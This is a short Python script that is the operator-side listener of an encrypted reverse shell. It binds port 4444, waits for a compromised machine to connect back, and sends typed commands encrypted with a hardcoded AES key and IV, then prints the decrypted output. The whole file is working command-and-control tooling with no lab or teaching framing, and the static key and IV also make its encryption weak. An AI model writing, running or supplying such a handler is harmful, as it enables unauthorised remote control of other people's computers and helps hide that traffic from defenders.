import socket
from Crypto.Cipher import AES
import base64

KEY = b'Sixteen byte key'  # 16-byte AES key
IV = b'This is an IV456'   # 16-byte IV

def decrypt(enc):
    cipher = AES.new(KEY, AES.MODE_CFB, IV)
    return cipher.decrypt(base64.b64decode(enc))

def encrypt(raw):
    cipher = AES.new(KEY, AES.MODE_CFB, IV)
    return base64.b64encode(cipher.encrypt(raw.encode()))

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 4444))
server.listen(1)
print("[*] Waiting for incoming connection...")

client, addr = server.accept()
print(f"[+] Connected from {addr}")

while True:
    cmd = input("Shell> ")
    client.send(encrypt(cmd))
    response = client.recv(4096)
    print(decrypt(response).decode())
